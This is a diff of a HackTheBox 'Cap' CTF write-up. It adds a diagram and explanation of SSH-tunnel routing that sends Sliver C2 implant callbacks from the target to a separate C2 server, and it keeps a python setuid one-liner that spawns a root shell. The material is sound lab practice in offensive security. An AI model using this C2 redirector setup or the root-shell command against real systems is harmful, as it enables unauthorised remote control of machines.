@@ -118,19 +118,117 @@ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 ### Network Routing Setup
 
-For post-exploitation practice with Sliver C2, network routing was configured:
+For post-exploitation practice with Sliver C2, network routing was configured to bridge the HTB network with the lab infrastructure.
 
-**Environment:**
-- Kali Machine: `192.168.36.172` (HTB VPN IP: `10.10.15.1`)
-- Sliver Server: `192.168.36.209:4443`
-- Cap Target: `10.129.3.86`
+#### Network Topology
 
-**SSH Tunnel:**
+```
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│                           HackTheBox Network Topology                            │
+│                                                                                  │
+│  ┌─────────────────────┐                    ┌──────────────────────────────┐   │
+│  │   Cap Target        │                    │      Kali Machine            │   │
+│  │  (HTB Network)      │                    │   (Lab Network + HTB VPN)    │   │
+│  ├─────────────────────┤                    ├──────────────────────────────┤   │
+│  │ IP: 10.129.3.86     │                    │ eth0: 192.168.36.172         │   │
+│  │ User: nathan        │◄───────────────────┤ tun0: 10.10.15.1 (HTB VPN)   │   │
+│  │ OS: Ubuntu 20.04    │  SSH (Initial)     │ OS: Kali Linux               │   │
+│  └─────────────────────┘  Port 22           └──────────────────────────────┘   │
+│           │                                               │                     │
+│           │                                               │                     │
+│           │  ┌─────────────────────────────────────────┐ │                     │
+│           │  │    Sliver C2 Callback Traffic Flow      │ │                     │
+│           │  └─────────────────────────────────────────┘ │                     │
+│           │                                               │                     │
+│           │  ①  MTLS Connection                          │                     │
+│           │     10.129.3.86:random → 10.10.15.1:443     │                     │
+│           └──────────────────────────────────────────────►                     │
+│                                                           │                     │
+│                                                           │                     │
+│                ┌──────────────────────────────────────────┘                     │
+│                │                                                                │
+│                │  ②  SSH Tunnel (Port Forward)                                 │
+│                │     10.10.15.1:443 → 127.0.0.1:4443                           │
+│                │     ssh -f -N -L 10.10.15.1:443:127.0.0.1:4443                │
+│                │                                                                │
+│                │                                                                │
+│                ▼                                                                │
+│  ┌──────────────────────────────────────┐                                      │
+│  │         Sliver C2 Server             │                                      │
+│  │      (Separate Server)               │                                      │
+│  ├──────────────────────────────────────┤                                      │
+│  │ IP: 192.168.36.209                   │◄─────────────────────────────────────┤
+│  │ Listener: 0.0.0.0:4443 (MTLS)        │  ③  Tunneled Traffic                │
+│  │ User: debian                         │     192.168.36.172 → 192.168.36.209 │
+│  │ OS: Debian 12                        │     Destination: 127.0.0.1:4443      │
+│  └──────────────────────────────────────┘                                      │
+│                                                                                 │
+└─────────────────────────────────────────────────────────────────────────────────┘
+```
+
+#### Traffic Flow Breakdown
+
+**Step 1: Sliver Implant Callback**
+```
+Cap Target (10.129.3.86) → Kali (10.10.15.1:443) → Sliver Server (192.168.36.209:4443)
+```
+
+1. Implant on Cap connects to `10.10.15.1:443` (Kali's HTB VPN IP)
+2. SSH tunnel on Kali forwards to `127.0.0.1:4443`
+3. Traffic routes to Sliver server at `192.168.36.209:4443`
+
+**Step 2: Command Execution (Reverse Flow)**
+```
+Sliver Console → Sliver Server → SSH Tunnel → Kali → Cap Target
+```
+
+1. Operator issues commands in Sliver console
+2. Commands travel through established MTLS session
+3. SSH tunnel forwards bidirectionally
+4. Commands execute on Cap target
+
+#### Network Configuration
+
+**Kali Machine:**
+- **eth0:** `192.168.36.172` (lab network)
+- **tun0:** `10.10.15.1` (HTB VPN)
+- **SSH Tunnel:** Binds to `10.10.15.1:443`, forwards to `192.168.36.209:4443`
+
+**Sliver Server:**
+- **IP:** `192.168.36.209`
+- **Listener:** `0.0.0.0:4443` (MTLS)
+- **Access:** Only accepts connections from `127.0.0.1` (via SSH tunnel)
+
+**Cap Target:**
+- **IP:** `10.129.3.86` (HTB network)
+- **Route:** Connects to `10.10.15.1` via HTB VPN gateway
+- **Implant:** Configured to connect to `10.10.15.1:443`
+
+#### Why This Architecture?
+
+**Problem:**
+- Cap target (`10.129.3.86`) is on HTB network
+- Sliver server (`192.168.36.209`) is on lab network
+- These networks cannot directly communicate
+
+**Solution:**
+- Kali machine has access to BOTH networks
+- SSH tunnel acts as a bridge between networks
+- Traffic is encrypted at two layers:
+  - MTLS (Sliver protocol)
+  - SSH tunnel (transport layer)
+
+**Benefits:**
+- ✓ Centralized C2 server (not on Kali)
+- ✓ Double encryption (MTLS + SSH)
+- ✓ Can support multiple operators
+- ✓ Easier logging and session management
+- ✓ Separates attack infrastructure from VPN endpoint
+
+**SSH Tunnel Command:**
 ```bash
 ssh -f -N -L 10.10.15.1:443:127.0.0.1:4443 debian@192.168.36.209
 ```
-
-This allows the Cap machine to connect back through the HTB VPN to the Sliver server.
 
 ### Sliver Implant Deployment
 
